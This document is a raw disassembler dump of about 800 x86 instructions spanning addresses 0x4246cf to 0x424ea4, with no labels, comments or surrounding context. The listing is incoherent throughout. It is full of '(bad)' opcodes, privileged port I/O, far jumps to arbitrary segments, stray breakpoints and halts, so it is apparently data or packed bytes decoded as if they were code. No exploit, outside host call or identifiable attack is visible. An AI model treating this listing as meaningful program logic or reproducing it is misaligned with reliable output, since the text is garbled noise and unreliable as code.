  4246cf:	mov    eax,ds:0x7b666533
  4246d4:	repnz into 
  4246d6:	jbe    0x424741
  4246d8:	xor    DWORD PTR [ebx],esp
  4246da:	and    al,0x1b
  4246dc:	shl    DWORD PTR [ecx+ebx*1-0x6611c8d7],cl
  4246e3:	mov    ch,0x77
  4246e5:	stos   BYTE PTR es:[edi],al
  4246e6:	inc    ebx
  4246e7:	int3   
  4246e8:	jmp    0x4246a3
  4246ea:	mov    edi,0xc5428c85
  4246ef:	mov    eax,0xc5610a0a
  4246f4:	xchg   edi,eax
  4246f5:	daa    
  4246f6:	sbb    eax,0x588a3539
  4246fb:	inc    ebp
  4246fc:	xchg   ecx,eax
  4246fd:	mov    ebp,0x5b198758
  424702:	leave  
  424703:	leave  
  424704:	je     0x4246bc
  424706:	xchg   ecx,eax
  424707:	add    eax,DWORD PTR [ebp+0x330fc80b]
  42470d:	sub    cl,BYTE PTR [ebp+0x60fd4fa6]
  424713:	pop    edx
  424714:	or     BYTE PTR [ecx+0x64d9099f],bl
  42471a:	(bad)  
  42471b:	std    
  42471c:	adc    BYTE PTR [ebx+ecx*2-0x2f2e4947],al
  424723:	adc    BYTE PTR [eax],0x22
  424726:	mov    cl,0x8e
  424728:	or     eax,0x824d1b4
  42472d:	cmc    
  42472e:	arpl   WORD PTR [esi-0x68cd9b14],bx
  424734:	sub    al,dl
  424736:	or     BYTE PTR [esi-0x5459ce12],dl
  42473c:	pop    es
  42473d:	pop    edi
  42473e:	xor    al,0x59
  424740:	sub    DWORD PTR [esi-0x76a8d7ce],ebx
  424746:	icebp  
  424747:	adc    DWORD PTR [ebx-0x3e7026d8],ebx
  42474d:	sub    BYTE PTR [eax+eiz*2-0x60],ah
  424751:	inc    esi
  424752:	sub    DWORD PTR [edi-0x249fa64a],ecx
  424758:	test   ebx,0x219f45db
  42475e:	mov    dl,0x26
  424760:	mov    dh,0xba
  424762:	int    0x82
  424764:	push   eax
  424765:	aaa    
  424766:	mov    DWORD PTR [ecx-0x6d5fffa3],edi
  42476c:	out    0x76,al
  42476e:	ss in  eax,dx
  424770:	nop
  424771:	dec    ebp
  424772:	arpl   di,sp
  424774:	mov    edx,0xbd82bb17
  424779:	mov    esi,0x5dfcd459
  42477e:	mov    ds:0x3fecd4b4,eax
  424783:	cmp    eax,DWORD PTR [ebx-0x64]
  424786:	(bad)  
  424787:	pushf  
  424788:	xchg   esi,eax
  424789:	aad    0xcf
  42478b:	and    al,0x7b
  42478d:	ins    BYTE PTR es:[edi],dx
  42478e:	js     0x424739
  424790:	or     al,0x61
  424792:	adc    al,0xd3
  424794:	shl    BYTE PTR [esp+edx*4+0x4d3b8032],0xc0
  42479c:	outs   dx,BYTE PTR ds:[esi]
  42479d:	ss cdq 
  42479f:	leave  
  4247a0:	push   ss
  4247a1:	mov    WORD PTR [ebp+0x1b],?
  4247a4:	in     al,0x63
  4247a6:	fmul   st(7),st
  4247a8:	arpl   WORD PTR [edx-0x2a2bc58a],dx
  4247ae:	leave  
  4247af:	push   es
  4247b0:	mov    dl,0xcd
  4247b2:	push   esp
  4247b3:	mov    DWORD PTR [eax+0x5f59fa50],esi
  4247b9:	enter  0x2dad,0xc5
  4247bd:	fiadd  WORD PTR [eax+0x79f7a7de]
  4247c3:	mov    esi,0xefe34d32
  4247c8:	mov    bl,0x11
  4247ca:	icebp  
  4247cb:	pusha  
  4247cc:	inc    esi
	...
  4247d9:	add    BYTE PTR [edi+edi*4+0x63],bl
  4247dd:	push   eax
  4247de:	jecxz  0x4247bc
  4247e0:	jg     0x4247a1
  4247e2:	data16 adc al,0x63
  4247e5:	sbb    al,0x51
  4247e7:	pop    esp
  4247e8:	adc    dh,cl
  4247ea:	ins    DWORD PTR es:[edi],dx
  4247eb:	rol    BYTE PTR [ecx],0x0
  4247ee:	sti    
  4247ef:	add    DWORD PTR [eax],eax
  4247f1:	add    BYTE PTR [esi-0x7f],bl
  4247f4:	aad    0x4c
  4247f6:	in     eax,dx
  4247f7:	mov    ds:0x35a0eda7,al
  4247fc:	mov    al,ds:0x52a04b06
  424801:	aam    0x17
  424803:	(bad)  
  424804:	push   esp
  424805:	xchg   DWORD PTR [eax],esi
  424807:	retf   0xd11f
  42480a:	cs scas al,BYTE PTR es:[edi]
  42480c:	push   cs
  42480d:	mov    edi,0x9620a8b9
  424812:	(bad)  
  424813:	cmp    ebx,DWORD PTR [ebp+ebx*8+0x2f5cba44]
  42481a:	sbb    ah,al
  42481c:	add    ebx,DWORD PTR [ecx-0x4eed0e52]
  424822:	rcl    BYTE PTR [edi],0x27
  424825:	sub    BYTE PTR [esi-0x1425181e],dh
  42482b:	mov    ebp,0x50155a83
  424830:	and    ah,BYTE PTR [ebp+0x35]
  424833:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424834:	dec    edi
  424835:	shl    DWORD PTR [esi-0x337dccfd],cl
  42483b:	jno    0x4247c1
  42483d:	mul    ch
  42483f:	repz retf 
  424841:	(bad)  
  424842:	jmp    0x30467a33
  424847:	add    al,0x21
  424849:	mov    ds:0xe7317332,ax
  42484f:	push   0x6b112431
  424854:	lea    edi,[ecx-0x2]
  424857:	loop   0x4248b2
  424859:	pop    es
  42485a:	xchg   edx,eax
  42485b:	(bad)  
  42485c:	jmp    0x42486b
  42485e:	clc    
  42485f:	mov    al,0xed
  424861:	jmp    0x617c0172
  424866:	les    ecx,FWORD PTR [ebx]
  424868:	mov    eax,ds:0xee12f766
  42486d:	mov    edx,0x71e78732
  424872:	or     al,0xcd
  424874:	xchg   esi,eax
  424875:	mov    fs,WORD PTR [edx-0x4e]
  424878:	or     ebp,DWORD PTR [esi+0x52]
  42487b:	rcl    BYTE PTR [esi+0x48],cl
  42487e:	jae    0x4248c0
  424880:	adc    ebp,DWORD PTR [edx]
  424882:	mov    bh,0x56
  424884:	add    DWORD PTR [esi+edx*4],esi
  424887:	xchg   esp,edi
  424889:	sub    DWORD PTR [ebx-0x6f],edi
  42488c:	outs   dx,DWORD PTR ds:[esi]
  42488d:	fidiv  WORD PTR [ebp-0x4dbb6986]
  424893:	das    
  424894:	mov    WORD PTR ds:0xd0772be6,?
  42489a:	rep lods al,BYTE PTR ds:[esi]
  42489c:	push   0xc8cf967
  4248a1:	(bad)  
  4248a2:	pop    esi
  4248a3:	pop    ds
  4248a4:	push   ebp
  4248a5:	ins    DWORD PTR es:[edi],dx
  4248a6:	or     BYTE PTR [ebx-0x9],al
  4248a9:	push   edx
  4248aa:	xchg   ecx,eax
  4248ab:	retf   0x852
  4248ae:	cmp    eax,0xb5339558
  4248b3:	mov    ds:0x7960b417,al
  4248b8:	adc    ch,BYTE PTR [edx+0x37]
  4248bb:	in     al,dx
  4248bc:	(bad)  [eax-0x42]
  4248bf:	xor    esp,0xa4b493b3
  4248c5:	lods   al,BYTE PTR ds:[esi]
  4248c6:	mov    ebx,0xf2579496
  4248cb:	xor    BYTE PTR [esi+0x11],bl
  4248ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248cf:	xor    eax,0x7ed313b7
  4248d4:	(bad)  
  4248d5:	dec    esi
  4248d6:	cmp    ch,bh
  4248d8:	inc    ecx
  4248d9:	xchg   edx,eax
  4248da:	lock xor esp,ebp
  4248dd:	inc    edi
  4248de:	es aad 0x9e
  4248e1:	hlt    
  4248e2:	mov    ah,0xd2
  4248e4:	lds    esi,FWORD PTR [edi]
  4248e6:	xchg   BYTE PTR [esp+edi*2+0x6a725913],ah
  4248ed:	mov    ah,0x13
  4248ef:	push   ecx
  4248f0:	das    
  4248f1:	pop    eax
  4248f2:	div    dl
  4248f4:	jb     0x424920
  4248f6:	xchg   edx,eax
  4248f7:	mov    ch,0x34
  4248f9:	test   eax,0xcebef1d6
  4248fe:	mov    ebp,0xc0bc0379
  424903:	icebp  
  424904:	cmp    BYTE PTR [esi-0x5f],bh
  424907:	repz lahf 
  424909:	cmp    BYTE PTR [esi-0x61],ch
  42490c:	out    0xde,al
  42490e:	inc    eax
  42490f:	mov    esp,0xcda10761
  424914:	loope  0x4248f2
  424916:	sti    
  424917:	jne    0x4248bb
  424919:	rol    esi,cl
  42491b:	mov    ds:0x94a4283a,eax
  424920:	leave  
  424921:	int3   
  424922:	mov    ebx,0x16c1b042
  424927:	retf   
  424928:	enter  0x4bc2,0x8d
  42492c:	fnstenv [eax+0x2609469f]
  424932:	dec    esi
  424933:	ins    BYTE PTR es:[edi],dx
  424934:	popa   
  424935:	push   esi
  424936:	fsubrp st(3),st
  424938:	out    0x9f,al
  42493a:	lods   eax,DWORD PTR ds:[esi]
  42493b:	imul   eax,esi,0xdff7824f
  424941:	adc    cl,dh
  424943:	or     ch,ah
  424945:	cmp    DWORD PTR [edi+ebp*4+0x6d],esp
  424949:	aad    0x86
  42494b:	scas   eax,DWORD PTR es:[edi]
  42494c:	and    cl,0x5b
  42494f:	push   0xcac7c304
  424954:	stc    
  424955:	hlt    
  424956:	int3   
  424957:	dec    esi
  424958:	outs   dx,DWORD PTR ds:[esi]
  424959:	lods   eax,DWORD PTR ds:[esi]
  42495a:	int    0x6a
  42495c:	cli    
  42495d:	jnp    0x4248f5
  42495f:	stc    
  424960:	aas    
  424961:	rol    BYTE PTR [ebx-0x2941ced6],cl
  424967:	imul   BYTE PTR ds:0x108e0167
  42496d:	mov    bl,0xe5
  42496f:	cdq    
  424970:	mov    ah,0x35
  424972:	sahf   
  424973:	mov    ah,0x8b
  424975:	jl     0x424942
  424977:	cmp    BYTE PTR [ecx-0x6b],bh
  42497a:	fwait
  42497b:	mov    WORD PTR [ebx],ss
  42497d:	pusha  
  42497e:	pop    ss
  42497f:	adc    edx,ebp
  424981:	out    dx,eax
  424982:	sub    DWORD PTR [edx-0x70dfa78c],ecx
  424988:	mov    BYTE PTR [edx+0x68],0x6c
  42498c:	pop    ds
  42498d:	jno    0x4249ec
  42498f:	cmp    BYTE PTR [edx],ch
  424991:	(bad)  
  424992:	mov    edx,0x90824096
  424997:	aam    0xb8
  424999:	outs   dx,DWORD PTR ds:[esi]
  42499a:	mov    edi,0xbac8bd3e
  42499f:	xor    ebp,DWORD PTR [esi+0x7e0f3083]
  4249a5:	or     dh,al
  4249a7:	cmp    bh,ch
  4249a9:	inc    ebx
  4249aa:	ds jno 0x4249e5
  4249ad:	adc    ebx,esp
  4249af:	in     eax,0x3f
  4249b1:	xor    ebx,DWORD PTR [ebx]
  4249b3:	addr16 mov dh,0xe5
  4249b6:	jb     0x424a37
  4249b8:	(bad)  
  4249b9:	shr    BYTE PTR [eax],0x2c
  4249bc:	test   ebp,eax
  4249be:	adc    edx,DWORD PTR [eax-0x6b64e50f]
  4249c4:	sbb    BYTE PTR [ebx+ebx*8+0x16],ah
  4249c8:	(bad)  
  4249c9:	and    cl,dl
  4249cb:	stc    
  4249cc:	sub    ch,BYTE PTR [eax]
  4249ce:	jno    0x424950
  4249d0:	xchg   ebx,eax
  4249d1:	mov    ah,0xf4
  4249d3:	pop    esi
  4249d4:	adc    ebx,0x1
  4249d7:	out    dx,al
  4249d8:	out    dx,eax
  4249d9:	mov    ds:0x4a866e18,eax
  4249de:	dec    ecx
  4249df:	jns    0x424a5a
  4249e1:	mov    ds:0x2748fe32,al
  4249e6:	push   esi
  4249e7:	xchg   dh,dh
  4249e9:	mov    ds:0x1a018f,eax
	...
  4249fa:	inc    ebx
  4249fb:	push   ebp
  4249fc:	pusha  
  4249fd:	(bad)  
  4249fe:	jbe    0x4249bf
  424a00:	out    dx,eax
  424a01:	(bad)  
  424a03:	test   al,0x37
  424a05:	stos   DWORD PTR es:[edi],eax
  424a06:	and    al,ah
  424a08:	cmp    esi,0x1c268
  424a0e:	sti    
  424a0f:	add    DWORD PTR [eax],eax
  424a11:	add    al,cl
  424a13:	(bad)  
  424a14:	imul   edi,DWORD PTR ds:0x5763b7d0,0xfffffff6
  424a1c:	mov    ebp,0x6678e857
  424a21:	sbb    dh,ah
  424a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a24:	jmp    0xdcbc66be
  424a29:	shl    BYTE PTR [esi],0xe6
  424a2c:	dec    ebx
  424a2d:	mov    ah,0x7c
  424a2f:	jge    0x4249ec
  424a31:	or     esi,ebp
  424a33:	mov    ecx,0x7287d116
  424a38:	xor    al,0xec
  424a3a:	jns    0x424ab5
  424a3c:	jmp    0x1e53:0xe237f009
  424a43:	dec    edx
  424a44:	sbb    eax,0xecaac5d0
  424a49:	icebp  
  424a4a:	push   edi
  424a4b:	dec    ecx
  424a4c:	mov    dh,0xff
  424a4e:	cmc    
  424a4f:	jne    0x424a3f
  424a51:	(bad)  
  424a52:	test   al,0xee
  424a54:	clc    
  424a55:	add    bh,bh
  424a57:	jge    0x4249f9
  424a59:	push   edx
  424a5a:	call   0xb3dc:0xd8e2c904
  424a61:	sbb    dh,BYTE PTR [edi-0x2e]
  424a64:	cwde   
  424a65:	sub    edx,ebx
  424a67:	std    
  424a68:	lods   al,BYTE PTR ds:[esi]
  424a69:	push   ss
  424a6a:	mov    ds:0x6b6cd974,eax
  424a6f:	sar    BYTE PTR [eax+0x24420bc9],cl
  424a75:	(bad)  
  424a76:	ins    DWORD PTR es:[edi],dx
  424a77:	sbb    bl,BYTE PTR [eax]
  424a79:	mov    WORD PTR [eax+0x5cfcb58f],gs
  424a7f:	jne    0x424aad
  424a81:	(bad)  
  424a83:	test   eax,0x8a5b50ea
  424a88:	jge    0x424ac3
  424a8a:	lods   al,BYTE PTR ds:[esi]
  424a8b:	and    al,0x9e
  424a8d:	mov    edx,esi
  424a8f:	inc    ecx
  424a90:	mov    ebp,0x116195f
  424a95:	mov    bh,0xf7
  424a97:	mov    dh,0xb3
  424a99:	or     DWORD PTR [eax+ebx*4+0x25],0x3e8ac45
  424aa1:	mov    eax,0x4e9cd5a3
  424aa6:	rcl    edi,0x1d
  424aa9:	call   DWORD PTR [esi+0x581ed196]
  424aaf:	outs   dx,BYTE PTR ds:[esi]
  424ab0:	mov    ah,0x26
  424ab2:	(bad)  [eax-0x30]
  424ab5:	sar    DWORD PTR [eax+0x35431b72],1
  424abb:	fbld   TBYTE PTR ds:0x61f743df
  424ac1:	shr    DWORD PTR [ebx],0xa6
  424ac4:	out    dx,al
  424ac5:	dec    ebx
  424ac6:	add    dh,BYTE PTR [esi+ebp*2-0x752adee9]
  424acd:	retf   0x662c
  424ad0:	jmp    0x9753a67e
  424ad5:	add    ah,BYTE PTR [ebx-0x48]
  424ad8:	into   
  424ad9:	out    0xad,al
  424adb:	(bad)  
  424adc:	in     eax,dx
  424add:	push   ebp
  424ade:	adc    cl,BYTE PTR [edi]
  424ae0:	ret    
  424ae1:	cmp    edx,ecx
  424ae3:	mov    ds:0x2ca610b6,eax
  424ae8:	mov    ch,0x6
  424aea:	jb     0x424abc
  424aec:	push   0xba2a8280
  424af1:	call   FWORD PTR [eax+ecx*4+0x33]
  424af5:	enter  0xb459,0xbe
  424af9:	sub    edx,esp
  424afb:	or     DWORD PTR [ecx+0x7d],esi
  424afe:	add    BYTE PTR [eax+ebx*1-0x3a],cl
  424b02:	cmp    al,0xcd
  424b04:	mov    ebx,0x265f82a7
  424b09:	adc    eax,0x18896664
  424b0e:	push   edi
  424b0f:	je     0x424ae5
  424b11:	aad    0xf6
  424b13:	in     eax,dx
  424b14:	shl    BYTE PTR [ecx-0xa5e018a],cl
  424b1a:	mov    ah,0xf6
  424b1c:	aas    
  424b1d:	jmp    0x8ecc3eb0
  424b22:	and    eax,0x2194f23b
  424b27:	fdiv   st(0),st
  424b29:	xlat   BYTE PTR ds:[ebx]
  424b2a:	sar    al,0x9e
  424b2d:	inc    edi
  424b2e:	pusha  
  424b2f:	adc    eax,0xe27b5747
  424b34:	mov    es,WORD PTR [ecx]
  424b36:	lds    ecx,FWORD PTR [edx+0x2f]
  424b39:	inc    ebx
  424b3a:	sahf   
  424b3b:	xchg   esp,eax
  424b3c:	fld    QWORD PTR ds:0x824931be
  424b42:	mov    ah,0xbd
  424b44:	add    ch,BYTE PTR [edx-0x4]
  424b47:	lock sbb bl,BYTE PTR [ebx]
  424b4a:	repz push esp
  424b4c:	add    al,dl
  424b4e:	jne    0x424bac
  424b50:	sahf   
  424b51:	mov    dh,0x6a
  424b53:	cwde   
  424b54:	inc    ebx
  424b55:	ficom  DWORD PTR [esp+ebx*4-0xc044fc1]
  424b5c:	addr16 mov al,ds:0x6163
  424b60:	xchg   ecx,eax
  424b61:	xor    BYTE PTR [ebx+esi*8-0xb],bh
  424b65:	sbb    esp,DWORD PTR [ebp+0x71]
  424b68:	sbb    BYTE PTR [eax],cl
  424b6a:	mov    bl,0xcf
  424b6c:	mov    ch,0xcf
  424b6e:	das    
  424b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b70:	mov    eax,ds:0xd29af3af
  424b75:	or     eax,0xf1288bda
  424b7a:	out    0x23,eax
  424b7c:	(bad)  
  424b7d:	cs push 0xa344226d
  424b83:	retf   0x9e95
  424b86:	call   0x4e84dbe1
  424b8b:	sub    ebx,esi
  424b8d:	scas   al,BYTE PTR es:[edi]
  424b8e:	ret    
  424b8f:	or     DWORD PTR [ebp+edi*1-0x20ac2292],ecx
  424b96:	xchg   ebp,eax
  424b97:	and    ah,ch
  424b99:	stos   DWORD PTR es:[edi],eax
  424b9a:	fidiv  DWORD PTR [ebp-0x1b87a7bb]
  424ba0:	sbb    edx,DWORD PTR [ecx-0x3]
  424ba3:	scas   eax,DWORD PTR es:[edi]
  424ba4:	das    
  424ba5:	mov    cl,0x3d
  424ba7:	add    DWORD PTR [esi],esi
  424ba9:	or     al,0x98
  424bab:	jnp    0x424c0b
  424bad:	ja     0x424b3d
  424baf:	enter  0x7ffd,0x8c
  424bb3:	bound  esi,QWORD PTR [ecx+0x38]
  424bb6:	jnp    0x424b99
  424bb8:	sti    
  424bb9:	xchg   ebp,eax
  424bba:	sahf   
  424bbb:	stos   BYTE PTR es:[edi],al
  424bbc:	loopne 0x424b69
  424bbe:	add    ecx,ebp
  424bc0:	jge    0x424c0a
  424bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bc3:	stos   DWORD PTR es:[edi],eax
  424bc4:	fisttp WORD PTR [esi+0x70]
  424bc7:	xchg   ecx,eax
  424bc8:	sti    
  424bc9:	mov    al,0x72
  424bcb:	mov    esi,0xb5f1820a
  424bd0:	inc    ecx
  424bd1:	popa   
  424bd2:	cmp    BYTE PTR [esi],0x9d
  424bd5:	xchg   DWORD PTR [ebx-0x732dc0a1],edx
  424bdb:	adc    al,0xf5
  424bdd:	jmp    0x8395:0x72f49cce
  424be4:	fiadd  WORD PTR [ecx+0x63e91776]
  424bea:	push   ecx
  424beb:	retf   0xc9c4
  424bee:	in     al,dx
  424bef:	cs push ecx
  424bf1:	dec    edx
  424bf2:	inc    ecx
  424bf3:	in     eax,0x9e
  424bf5:	inc    edi
  424bf6:	xor    bh,ch
  424bf8:	pushf  
  424bf9:	rcr    DWORD PTR [edx-0xd],1
  424bfc:	push   edi
  424bfd:	sbb    al,0xa1
  424bff:	rcr    DWORD PTR [edi-0x19],0x93
  424c03:	xchg   ebx,eax
  424c04:	ja     0x424bb1
  424c06:	enter  0x4f26,0xd9
  424c0a:	adc    edi,DWORD PTR [edi+0x4c]
	...
  424c19:	add    BYTE PTR [edi+0x2d],dl
  424c1c:	pop    es
  424c1d:	call   0xe967:0xeddfba7f
  424c24:	addr16 xor al,0x41
  424c27:	scas   al,BYTE PTR es:[edi]
  424c28:	retf   0x6391
  424c2b:	les    eax,FWORD PTR [ecx]
  424c2d:	add    bl,bh
  424c2f:	add    DWORD PTR [eax],eax
  424c31:	add    dh,dh
  424c33:	sub    eax,DWORD PTR [esi]
  424c35:	inc    esi
  424c36:	mov    gs,WORD PTR [ecx]
  424c38:	sub    edi,ebp
  424c3a:	mov    edi,0x7cf35a9c
  424c3f:	imul   esi,DWORD PTR [ebx],0x60
  424c42:	adc    eax,0x8130db9f
  424c47:	ja     0x424c2d
  424c49:	push   ss
  424c4a:	push   ecx
  424c4b:	int    0x66
  424c4d:	jle    0x424c73
  424c4f:	sub    al,0x34
  424c51:	(bad)  
  424c52:	sti    
  424c53:	pop    ecx
  424c54:	push   edi
  424c55:	sbb    ecx,ebx
  424c57:	and    edx,DWORD PTR [esi-0x488ae7d5]
  424c5d:	dec    esi
  424c5e:	int    0xf6
  424c60:	cmp    dh,BYTE PTR [esi+0x30384b2]
  424c66:	adc    eax,DWORD PTR [ebx-0xf]
  424c69:	pop    es
  424c6a:	sbb    al,0xb9
  424c6c:	stos   DWORD PTR es:[edi],eax
  424c6d:	lods   eax,DWORD PTR ds:[esi]
  424c6e:	sub    esp,ecx
  424c70:	pop    edx
  424c71:	(bad)  
  424c72:	sbb    DWORD PTR [edx],eax
  424c74:	stos   DWORD PTR es:[edi],eax
  424c75:	adc    eax,0xdd936c25
  424c7a:	push   ds
  424c7b:	mov    ebp,0x26078362
  424c80:	xchg   edi,eax
  424c81:	push   ecx
  424c82:	pop    esi
  424c83:	loope  0x424c69
  424c85:	cli    
  424c86:	xchg   BYTE PTR ds:0x4b2bdceb,bh
  424c8c:	jg     0x424c8a
  424c8e:	int3   
  424c8f:	retf   0xeb82
  424c92:	add    DWORD PTR [ebx+esi*8+0x6205b3be],eax
  424c99:	push   edx
  424c9a:	test   al,0x15
  424c9c:	lahf   
  424c9d:	loopne 0x424d1a
  424c9f:	add    eax,0x773dc999
  424ca4:	sub    DWORD PTR [esi-0x4f],esi
  424ca7:	jmp    FWORD PTR [esi+eax*8]
  424caa:	sub    edi,edx
  424cac:	add    ch,BYTE PTR [ecx]
  424cae:	push   ebp
  424caf:	imul   eax,DWORD PTR [edx],0xffffffd8
  424cb2:	inc    eax
  424cb3:	cli    
  424cb4:	aad    0x0
  424cb6:	cld    
  424cb7:	daa    
  424cb8:	and    eax,0xe123e63f
  424cbd:	push   ds
  424cbe:	xchg   BYTE PTR [ecx-0x13eee6a4],ch
  424cc4:	fnstenv [ebp+0x3181f784]
  424cca:	or     DWORD PTR [ecx+0x20],ebx
  424ccd:	sti    
  424cce:	ss fs inc esp
  424cd1:	push   ds
  424cd2:	nop
  424cd3:	dec    eax
  424cd4:	sbb    ecx,ebx
  424cd6:	out    dx,al
  424cd7:	ss test edx,esi
  424cda:	xor    al,0x2e
  424cdc:	test   BYTE PTR [esi+eiz*4+0xf],cl
  424ce0:	leave  
  424ce1:	inc    ebx
  424ce2:	shl    dh,0xa0
  424ce5:	mov    ebp,0xf3da3af4
  424cea:	dec    BYTE PTR [edx+0x62]
  424ced:	mov    ah,0x8e
  424cef:	cdq    
  424cf0:	jae    0x424cc3
  424cf2:	pop    ss
  424cf3:	dec    edx
  424cf4:	and    eax,eax
  424cf6:	cwde   
  424cf7:	cmp    ecx,DWORD PTR [ecx]
  424cf9:	ds xor eax,0xdc8326b3
  424cff:	mov    edx,0x4f703c11
  424d04:	scas   eax,DWORD PTR es:[edi]
  424d05:	cli    
  424d06:	xor    al,0x61
  424d08:	cmc    
  424d09:	pop    esi
  424d0a:	test   BYTE PTR [esp+edi*4+0x5],bh
  424d0e:	repz inc esp
  424d10:	sbb    eax,0x9cc22c31
  424d15:	jo     0x424cc2
  424d17:	imul   esp,DWORD PTR [ecx-0x6e262a1e],0x3d5bb054
  424d21:	adc    eax,DWORD PTR [ecx]
  424d23:	das    
  424d24:	arpl   WORD PTR [eax-0x7a],di
  424d27:	or     DWORD PTR [edi-0x34],esi
  424d2a:	jmp    0xb681:0x5f6b4aa3
  424d31:	stc    
  424d32:	xchg   esi,eax
  424d33:	jg     0x424d35
  424d35:	aas    
  424d36:	xor    eax,0x2e0ac173
  424d3b:	adc    eax,0x74d9d931
  424d40:	imul   cx,WORD PTR [edx-0xf],0xfdb5
  424d46:	sbb    eax,0xaf98a356
  424d4b:	in     eax,0x91
  424d4d:	push   0xffffffa6
  424d4f:	out    dx,al
  424d50:	rcl    DWORD PTR [edx-0x2851a553],cl
  424d56:	test   eax,0x3c67e48e
  424d5b:	pusha  
  424d5c:	cli    
  424d5d:	and    al,0x71
  424d5f:	lods   eax,DWORD PTR ds:[esi]
  424d60:	imul   BYTE PTR [ebx]
  424d62:	outs   dx,DWORD PTR ds:[esi]
  424d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d64:	adc    ecx,DWORD PTR [edx+0x13fd9a3]
  424d6a:	sub    ah,bl
  424d6c:	sbb    ah,BYTE PTR [edx+eax*8+0x2d]
  424d70:	push   edi
  424d71:	xchg   ebp,eax
  424d72:	xchg   esi,eax
  424d73:	and    al,0x1a
  424d75:	mov    dl,0xd1
  424d77:	pop    edi
  424d78:	repnz adc BYTE PTR [ebp-0x29],ch
  424d7c:	(bad)  
  424d7d:	pop    edi
  424d7e:	sub    esp,esi
  424d80:	or     DWORD PTR [edx],esp
  424d82:	(bad)  
  424d83:	addr16 (bad) 
  424d85:	enter  0xa7e0,0x92
  424d89:	mov    ecx,edi
  424d8b:	sti    
  424d8c:	push   ds
  424d8d:	jecxz  0x424dba
  424d8f:	icebp  
  424d90:	sbb    al,0x84
  424d92:	sbb    BYTE PTR ds:0x7fa1a07a,dh
  424d98:	dec    ebp
  424d99:	pop    esp
  424d9a:	xchg   edi,eax
  424d9b:	ins    BYTE PTR es:[edi],dx
  424d9c:	fcos   
  424d9e:	jmp    0x6abc:0xcae687a4
  424da5:	xchg   edi,ebp
  424da7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424da8:	push   edx
  424da9:	jns    0x424de1
  424dab:	pushf  
  424dac:	and    BYTE PTR [ecx+ebp*8],bl
  424daf:	scas   al,BYTE PTR es:[edi]
  424db0:	div    ch
  424db2:	or     eax,0x343f25e9
  424db7:	sbb    al,0x4b
  424db9:	mov    al,0x3b
  424dbb:	std    
  424dbc:	ins    DWORD PTR es:[edi],dx
  424dbd:	pop    es
  424dbe:	pop    edi
  424dbf:	int3   
  424dc0:	lods   eax,DWORD PTR ds:[esi]
  424dc1:	jg     0x424d64
  424dc3:	xor    ecx,esp
  424dc5:	into   
  424dc6:	sti    
  424dc7:	repz rcr DWORD PTR ds:0xf0ef7d94,1
  424dce:	adc    al,0xc2
  424dd0:	sbb    esp,ebx
  424dd2:	(bad)  
  424dd4:	push   ds
  424dd5:	std    
  424dd6:	sahf   
  424dd7:	jmp    0xa789:0xbdfac59e
  424dde:	jle    0x424d63
  424de0:	or     dh,BYTE PTR [edi-0x24]
  424de3:	std    
  424de4:	aaa    
  424de5:	out    dx,eax
  424de6:	clc    
  424de7:	imul   BYTE PTR [ecx+0x624fd93]
  424ded:	or     al,0x4a
  424def:	xchg   ah,ch
  424df1:	push   es
  424df2:	or     DWORD PTR [ebx],esp
  424df4:	arpl   WORD PTR [ebp-0x25],cx
  424df7:	das    
  424df8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424df9:	gs jns 0x424da3
  424dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dff:	int    0xfe
  424e01:	scas   eax,DWORD PTR es:[edi]
  424e02:	or     al,0x44
  424e04:	cld    
  424e05:	push   esp
  424e06:	xchg   esp,eax
  424e07:	add    al,0x90
  424e09:	arpl   WORD PTR [ebx-0x7a],si
  424e0c:	cmp    edx,0x12294a69
  424e12:	leave  
  424e13:	mov    ch,0x40
  424e15:	mov    esp,0xb25c01ac
  424e1a:	shl    ah,0xb8
  424e1d:	(bad)  
  424e1e:	fld    DWORD PTR [edi]
  424e20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e21:	push   esi
  424e22:	xchg   ecx,eax
  424e23:	or     dl,cl
  424e25:	adc    bl,bl
  424e27:	aaa    
  424e28:	leave  
  424e29:	push   ecx
  424e2a:	dec    ebp
  424e2b:	ins    BYTE PTR es:[edi],dx
  424e2c:	rol    DWORD PTR [eax],0x0
	...
  424e37:	add    BYTE PTR [eax],al
  424e39:	add    BYTE PTR [edx+ebp*1+0x2b],ch
  424e3d:	outs   dx,DWORD PTR es:[esi]
  424e3f:	daa    
  424e40:	ins    DWORD PTR es:[edi],dx
  424e41:	push   0xffffffda
  424e43:	add    BYTE PTR [ecx],0x9d
  424e46:	mov    DWORD PTR [eax-0x39a190a8],esp
  424e4c:	add    DWORD PTR [eax],eax
  424e4e:	sti    
  424e4f:	add    DWORD PTR [eax],eax
  424e51:	add    al,bh
  424e53:	sub    ch,BYTE PTR [edi-0x1549808f]
  424e59:	jl     0x424e74
  424e5b:	cli    
  424e5c:	jnp    0x424e21
  424e5e:	fdiv   QWORD PTR [esi-0x7d080768]
  424e64:	pop    ecx
  424e65:	sar    DWORD PTR [eax+0x2f],1
  424e68:	jo     0x424dfe
  424e6a:	(bad)  
  424e6b:	repz sbb edx,esi
  424e6e:	fld    DWORD PTR [ebx+0x42460aec]
  424e74:	nop
  424e75:	adc    bl,BYTE PTR [eax+0x9a6a0fc]
  424e7b:	(bad)  
  424e7c:	or     edi,DWORD PTR [esi+0x7bcac46b]
  424e82:	mov    bl,0xc7
  424e84:	test   BYTE PTR [edi-0x411c8048],0xd6
  424e8b:	push   ecx
  424e8c:	out    0x1,al
  424e8e:	(bad)  
  424e8f:	(bad)  
  424e90:	cmp    al,0x3e
  424e92:	cmp    ecx,DWORD PTR [ecx+edi*2+0x646debda]
  424e99:	scas   eax,DWORD PTR es:[edi]
  424e9a:	ffree  st(1)
  424e9c:	inc    esi
  424e9d:	shl    DWORD PTR [ebx+eax*2-0x57],cl
  424ea1:	sar    ch,cl
  424ea3:	iret   
  424ea4:	test   al,0x77
